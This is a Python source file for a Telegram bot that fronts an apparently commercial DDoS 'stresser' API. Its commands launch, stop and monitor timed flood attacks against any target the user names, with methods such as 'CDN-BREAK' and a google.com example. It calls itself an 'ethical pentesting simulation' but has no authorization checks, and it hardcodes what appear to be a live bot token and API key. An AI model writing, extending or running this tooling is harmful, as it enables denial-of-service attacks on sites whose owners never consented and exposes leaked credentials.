import logging
import requests
import json
from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# --- Health / port binder for Render (KEEPING THIS AS REQUESTED) ---
class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Simple health endpoint, respond OK for GET
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        # suppress default stdout logging from HTTP server
        return

def _start_health_server():
    port = int(os.environ.get("PORT", "10000"))  # Render sets $PORT for you
    server_address = ("0.0.0.0", port)
    httpd = HTTPServer(server_address, _HealthHandler)
    # This blocks inside the thread
    httpd.serve_forever()

# Start HTTP server in a daemon thread so it doesn't block program exit
_health_thread = threading.Thread(target=_start_health_server, daemon=True)
_health_thread.start()


# --- CONFIGURATION ---
BOT_TOKEN = "7814912313:AAHyhW2b17XHgfcyw-26wQSKHZSpCpM9uTs"
USER_API_KEY = "38698f04-75e1-4bb6-904e-17850e4ca52d"

# Base URL for the learning platform API
API_BASE_URL = "https://vire.cc/api/v1"

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- UTILITY FUNCTION FOR API CALLS ---

def call_api(path: str, params: dict = None, requires_auth: bool = True) -> dict:
    """
    FIXED: The logic now ASSUMES AUTH IS ALWAYS REQUIRED for simplicity,
    based on the CLI testing that showed /methods and /stats failed without 'user'.
    """
    
    if USER_API_KEY == "YOUR_PERSONAL_API_KEY":
        return {"success": False, "error": "Configuration Error: Please set the USER_API_KEY variable in the script."}
    
    full_url = f"{API_BASE_URL}/{path}"
    
    if params is None:
        params = {}

    # FIX: AUTHENTICATION LOGIC is now always applied, as the server expects it
    if requires_auth or path in ["methods", "stats", "user"]: # Ensure key is always sent for info endpoints
        params['user'] = USER_API_KEY

    try:
        response = requests.get(full_url, params=params, timeout=10)
        response.raise_for_status()  # Raise HTTPError for 4xx/5xx
        
        data = response.json()
        
        if data.get('success') is False:
            error_message = data.get('error', 'Unknown API Error')
            error_code = data.get('code', 'N/A')
            return {"success": False, "error": f"API Error ({error_code}): {error_message}"}
            
        return {"success": True, "data": data.get('data', data)}
        
    except requests.exceptions.HTTPError as e:
        # Tries to read the error body if it's JSON
        try:
            error_data = e.response.json()
            error_message = error_data.get('error', e.response.reason)
            return {"success": False, "error": f"{e.response.status_code} Client Error: {error_message}"}
        except:
            return {"success": False, "error": f"{e.response.status_code} Client Error: {e.response.reason}"}
    except requests.exceptions.RequestException as e:
        logger.error(f"API Request failed for {full_url}: {e}")
        return {"success": False, "error": f"Connection Error: Could not reach the API."}
    except json.JSONDecodeError:
        return {"success": False, "error": "Invalid API Response: Expected JSON."}
    except Exception as e:
        return {"success": False, "error": f"An unexpected error occurred: {e}"}

# --- INTERACTIVITY COMPONENTS ---

# Menu Button (Reply Keyboard for Main Actions)
MAIN_MENU_KEYBOARD = [
    ["🚀 Launch Attack", "📊 Status Check"],
    ["📚 Methods", "👤 User Info", "📈 Server Stats"]
]
MAIN_MENU_MARKUP = ReplyKeyboardMarkup(MAIN_MENU_KEYBOARD, resize_keyboard=True, one_time_keyboard=False)

# Inline Keyboard for Status/Stop
def get_status_inline_markup():
    keyboard = [
        [
            InlineKeyboardButton("Check ALL Status 📊", callback_data='status_all'),
            InlineKeyboardButton("Stop ALL Attacks 🛑", callback_data='stop_all')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- TELEGRAM HANDLERS (COMMANDS) ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends the introductory message and sets the reply keyboard."""
    message = (
        "💻 **Ethical Pentesting Simulation Bot**\n\n"
        "Welcome to your stress testing interface! Use the menu buttons below or the following commands to get started.\n\n"
        "**Primary Commands (Must be typed):**\n"
        "**`/launch <target> <time> <method>`**\n"
        "**`/stop <attack_id|all>`**\n"
        "**`/status <attack_id|all>`**\n\n"
        "**Use the keyboard for Info Commands!**"
    )
    # Send message with the main reply keyboard
    await update.message.reply_text(message, parse_mode='Markdown', reply_markup=MAIN_MENU_MARKUP)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Simply calls the start command for help."""
    await start_command(update, context)

# All other command handlers remain the same, but now the utility function is fixed.

async def launch_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles the /launch command to start a stress test."""
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "🛑 **Invalid usage.**\n"
            "Use: `/launch <target> <time_seconds> <method>`\n"
            "Example: `/launch sample.edu 60 HTTP`"
        )
        return

    target, time_str, method = args
    
    try:
        time_int = int(time_str)
    except ValueError:
        await update.message.reply_text("🛑 **Invalid Time.** The time parameter must be a whole number in seconds.")
        return

    params = {
        "target": target,
        "time": time_int,
        "method": method
    }

    await update.message.reply_text(f"🚀 Attempting to launch **{method}** attack on `{target}` for {time_int} seconds...", parse_mode='Markdown')
    
    response = call_api("start", params=params, requires_auth=True)

    if response["success"]:
        message = response['data'].get('message', 'Attack launched successfully! Check status with /status.')
        await update.message.reply_text(f"✅ **Success!**\n\n{message}", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ **Launch Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles the /stop command to halt an attack."""
    # Determine the attack_id from command args or default to 'all' if invoked via callback
    if context.args:
        attack_id = context.args[0]
        send_to = update.message
    elif context.match == 'stop_all':
        attack_id = 'all'
        send_to = update.callback_query
        await send_to.answer() # Acknowledge the button press
    else:
        await update.message.reply_text(
            "🛑 **Invalid usage.**\n"
            "Use: `/stop <attack_id>` or `/stop all`"
        )
        return
    
    params = {}
    if attack_id.lower() != 'all':
        params['attack_id'] = attack_id
    
    
    await send_to.reply_text(f"🛑 Attempting to stop attack(s): `{attack_id}`...", parse_mode='Markdown')
    
    response = call_api("stop", params=params, requires_auth=True)

    if response["success"]:
        message = response['data'].get('message', f'Attack(s) `{attack_id}` stopped.')
        await send_to.reply_text(f"✅ **Stop Success!**\n\n{message}", parse_mode='Markdown')
    else:
        await send_to.reply_text(f"❌ **Stop Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def get_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles the /status command and 'Status Check' button to check attack status."""
    
    # Determine attack_id and send_to object based on source (command or callback)
    if update.callback_query:
        attack_id = 'all'  # Callback is always for all status
        send_to = update.callback_query
        await send_to.answer() # Acknowledge the button press
    elif context.args:
        attack_id = context.args[0] if len(context.args) == 1 else 'all'
        send_to = update.message
    else: # Invoked via /status with no args or 'Status Check' reply button
        attack_id = 'all'
        send_to = update.message

    params = {}
    if attack_id.lower() != 'all':
        params['attack_id'] = attack_id
    
    # Send "fetching" message
    await send_to.reply_text(f"🔍 Checking status for: `{attack_id}`...", parse_mode='Markdown')
    
    # API Call: Now correctly sends 'user' parameter thanks to the call_api fix
    response = call_api("status", params=params, requires_auth=True)

    if response["success"]:
        status_data = response["data"]
        
        if isinstance(status_data, list):
            if not status_data:
                info_text = "ℹ️ **Status Check**\n\nNo active attacks found."
            else:
                info_text = "📊 **Active Attacks Found:**\n\n"
                for i, attack in enumerate(status_data):
                    info_text += (
                        f"**ID:** `{attack.get('id', 'N/A')}`\n"
                        f"**Target:** `{attack.get('target', 'N/A')}`\n"
                        f"**Status:** `{attack.get('status', 'N/A')}` | **Remaining:** `{attack.get('time_remaining', 'N/A')}`s\n"
                        f"{'='*20}\n" if i < len(status_data) - 1 else ""
                    )
        elif isinstance(status_data, dict):
            # Status for a single attack
            info_text = (
                f"📊 **Attack Status ({attack_id})**\n\n"
                f"**Target:** `{status_data.get('target', 'N/A')}`\n"
                f"**Status:** `{status_data.get('status', 'N/A')}`\n"
                f"**Method:** `{status_data.get('method', 'N/A')}`\n"
                f"**Time Left:** `{status_data.get('time_remaining', 'N/A')}` seconds\n"
            )
        else:
            info_text = f"Status data received in an unexpected format: ```{status_data}```"

        # Add inline buttons for easy follow-up actions
        await send_to.reply_text(info_text, parse_mode='Markdown', reply_markup=get_status_inline_markup())
    else:
        await send_to.reply_text(f"❌ **Status Check Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def list_methods(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Fetches and displays available attack methods."""
    send_to = update.message
    await send_to.reply_text("🔍 Fetching available methods...", parse_mode='Markdown')

    # API Call: Now correctly sends 'user' parameter thanks to the call_api fix
    response = call_api("methods", requires_auth=True)

    if response["success"]:
        methods_data = response["data"]
        
        if isinstance(methods_data, dict) and 'methods' in methods_data:
            methods = methods_data['methods']
        elif isinstance(methods_data, list):
            methods = methods_data
        else:
            methods = []

        if methods:
            # Format the output nicely
            info_text = "📚 **Available Attack Methods**\n\n"
            for method in methods:
                name = method.get('name', 'N/A')
                layer = method.get('layer', 'N/A')
                category = method.get('category', 'N/A')
                description = method.get('description', 'No description')
                
                info_text += (
                    f"**`{name}`** ({category} | {layer})\n"
                    f"  - {description}\n"
                )
            
            info_text += f"\nTotal Methods: `{len(methods)}`"

            await send_to.reply_text(info_text, parse_mode='Markdown')
        else:
            await send_to.reply_text("The API did not return any available methods.", parse_mode='Markdown')
    else:
        await send_to.reply_text(f"❌ **Methods List Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def get_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Fetches and displays user information."""
    send_to = update.message
    await send_to.reply_text("🔍 Fetching user information...", parse_mode='Markdown')

    # API Call: Now correctly sends 'user' parameter
    response = call_api("user", requires_auth=True)

    if response["success"]:
        user_data = response["data"].get('user_info', {}) # Drill into user_info if it exists
        plan_features = response["data"].get('plan_features', {})
        
        info_text = (
            "👤 **User Account Details**\n\n"
            f"**Username:** `{user_data.get('username', 'N/A')}`\n"
            f"**Plan:** `{user_data.get('plan', 'N/A')}`\n"
            f"**Expires:** `{user_data.get('plan_expires', 'N/A')}`\n"
            f"**Concurrent Limit:** `{plan_features.get('concurrent_attacks', 'N/A')}`\n"
            f"**Max Time:** `{plan_features.get('max_attack_time', 'N/A')}` seconds\n"
            f"**API Key:** `{USER_API_KEY[:4]}...` (hidden for security)\n"
        )
        await send_to.reply_text(info_text, parse_mode='Markdown')
    else:
        await send_to.reply_text(f"❌ **User Info Failed.**\n\n{response['error']}", parse_mode='Markdown')


async def get_server_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Fetches and displays server statistics."""
    send_to = update.message
    await send_to.reply_text("🔍 Fetching server statistics...", parse_mode='Markdown')

    # API Call: Now correctly sends 'user' parameter thanks to the call_api fix
    response = call_api("stats", requires_auth=True)

    if response["success"]:
        stats_data = response["data"]
        
        info_text = "📊 **Server and Platform Statistics**\n\n"
        
        if isinstance(stats_data, dict):
            # Server Info
            server_info = stats_data.get('server_info', {})
            info_text += "**⚙️ Server Info**\n"
            info_text += f"**Status:** `{server_info.get('server_status', 'N/A')}`\n"
            info_text += f"**Uptime:** `{server_info.get('uptime', 'N/A')}`\n"
            info_text += f"**API Version:** `{server_info.get('api_version', 'N/A')}`\n\n"
            
            # User Stats
            user_stats = stats_data.get('user_statistics', {})
            info_text += "**👥 User Stats**\n"
            info_text += f"**Total Users:** `{user_stats.get('total_users', 'N/A')}`\n"
            info_text += f"**Active Users:** `{user_stats.get('active_users', 'N/A')}`\n"
            info_text += f"**Premium Users:** `{user_stats.get('premium_users', 'N/A')}`\n\n"
            
            # Attack Stats
            attack_stats = stats_data.get('attack_statistics', {})
            info_text += "**💣 Attack Stats**\n"
            info_text += f"**Total Running:** `{attack_stats.get('total_running', 'N/A')}`\n"
            info_text += f"**Avg Duration:** `{attack_stats.get('average_duration', 'N/A')}s`\n"
            
            # Attacks by Method - requires formatting
            methods = attack_stats.get('attacks_by_method', {})
            if methods:
                method_list = ', '.join([f"{k}: {v}" for k, v in methods.items()])
                info_text += f"**By Method:** `{method_list}`\n"
            
        else:
            info_text += f"Data in unexpected format: `{stats_data}`"

        await send_to.reply_text(info_text, parse_mode='Markdown')
    else:
        await send_to.reply_text(f"❌ **Stats Failed.**\n\n{response['error']}", parse_mode='Markdown')

# --- CALLBACK QUERY HANDLER ---
async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Routes inline button presses to the correct handlers."""
    query = update.callback_query
    
    if query.data == 'status_all':
        # Use the get_status handler, which is now designed to handle callbacks
        await get_status(update, context)
    elif query.data == 'stop_all':
        # Manually set context.match for stop_attack to know it's a 'stop all' call
        context.match = 'stop_all'
        await stop_attack(update, context)
    # NOTE: Other callback queries (like method names) could be added here later

# --- MESSAGE HANDLER FOR MENU BUTTONS ---
async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Routes reply keyboard button presses to the correct command handlers."""
    text = update.message.text
    
    if text == "📚 Methods":
        await list_methods(update, context)
    elif text == "👤 User Info":
        await get_user_info(update, context)
    elif text == "📈 Server Stats":
        await get_server_stats(update, context)
    elif text == "📊 Status Check":
        await get_status(update, context)
    elif text == "🚀 Launch Attack":
        # Prompt user on how to use /launch command
        await update.message.reply_text(
            "Use the command: `/launch <target> <time_seconds> <method>`\n\n"
            "Example: `/launch google.com 60 CDN-BREAK`",
            parse_mode='Markdown'
        )
    else:
        # Generic message handler for non-command/non-menu text
        await update.message.reply_text("I only handle specific commands or menu buttons. Use /help to see all options.")

# --- MAIN BOT RUNNER ---

async def set_bot_commands(application: Application):
    """Set up the persistent menu commands for the bot."""
    commands = [
        BotCommand("start", "Welcome and Main Menu"),
        BotCommand("help", "Show command guide"),
        BotCommand("launch", "Start a stress test attack"),
        BotCommand("stop", "Stop an attack or all attacks"),
        BotCommand("status", "Check attack status"),
        BotCommand("methods", "List all available attack methods"),
        BotCommand("user", "Get your account information"),
        BotCommand("stats", "Get server statistics"),
    ]
    await application.bot.set_my_commands(commands)
    logger.info("Bot commands set.")


def main() -> None:
    """Starts the bot by checking configuration and setting up handlers."""
    
    application = Application.builder().token(BOT_TOKEN).post_init(set_bot_commands).build()

    # Register handlers for commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Simulation Commands
    application.add_handler(CommandHandler("launch", launch_attack))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("status", get_status))
    
    # Info Commands
    application.add_handler(CommandHandler("methods", list_methods))
    application.add_handler(CommandHandler("user", get_user_info))
    application.add_handler(CommandHandler("stats", get_server_stats))
    
    # Interactivity Handlers
    application.add_handler(CallbackQueryHandler(handle_callback_query)) # For inline buttons
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu_buttons)) # For reply keyboard
    
    # Handle unknown commands
    application.add_handler(MessageHandler(filters.COMMAND, lambda u, c: u.message.reply_text("Unknown command. Use /help or the menu buttons.")))

    # Run the bot
    logger.info("Bot started successfully. Listening for updates...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
